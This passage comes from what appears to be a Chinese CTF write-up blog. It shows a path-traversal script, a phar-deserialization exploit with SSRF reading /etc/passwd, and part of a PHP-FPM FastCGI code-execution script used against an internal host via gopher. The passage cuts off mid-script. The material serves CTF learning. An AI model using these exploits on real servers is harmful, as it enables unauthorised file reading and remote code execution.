class=""><p>可以发现有两个参数，一个是时间戳一个是base64加密后的文件名，解码一下是gpa.png</p><p>刷新一下会发现提示：what’s your time?</p><p>说明时间要保持最新，直接目录穿越</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><p>然后base64加密一下传给f，t要更新到最新</p><img src="/2020/07/31/DSAJuly/5.png" class=""><p>当然也可以用半自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">t = int(time.time())</span><br><span class="line">f = <span class="string">'gqy.jpg?../../../../../../flag'</span></span><br><span class="line">f = base64.b64encode(f.encode()).decode()</span><br><span class="line">print(t, f)</span><br><span class="line">host = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t, f)</span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=host, headers=head)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>顺利拿到flag</p><img src="/2020/07/31/DSAJuly/6.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> DAS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019-phar-matches-everything</title>
      <link href="/2020/07/30/NCTF2019-phar-matches-everything/"/>
      <url>/2020/07/30/NCTF2019-phar-matches-everything/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点<a id="more"></a></h2><ul><li>vim的swp恢复文件</li><li>phar反序列化</li><li>protected属性与public属性序列化区别</li><li>生成攻击PHP-FPM的TCP数据流的脚本</li><li>gopher打PHP-FPM</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>打开题目，能够上传文件，题目就是phar，那肯定与phar反序列化有关</p><p>扫描目录，没有发现什么隐藏文件，看了wp说是用.swp恢复，但是试的时候没恢复出来，直接GitHub拿下了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要绕过getimagesize的验证，加上GIF89a，这里还要让Easytest类中的$test===‘1’，然后就可以利用curl来读取文件内容</p><p>下面就是写一个phar反序列化的exp来验证一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $test = <span class="string">'1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $url =<span class="string">'file:///etc/passwd'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">$b = <span class="keyword">new</span> Main();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a'</span> . <span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>这里直接对序列化的数据进行url编码，经过测试需要编码</p><p>将本地生成的phar文件后缀修改成gif，上传，然后访问</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/1.png" class=""><p>不知道是怎么看出打内网的，先跟着继续</p><p>改变url读取/etc/hosts</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/2.png" class=""><p>成功读取到了一台主机地址173.111.147.10</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/3.png" class=""><p>用http协议访问一下该网址，发现就是这个页面</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/4.png" class=""><p>根据之前buu做题经验，应该是下一台173.111.147.11，访问一下</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/5.png" class=""><p>果然是这样，还有提示是跟PHP-FPM相关，下面就是ssrf+gopher打fpm，先来看一下phpinfo();,下面是生成TCP数据流的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, 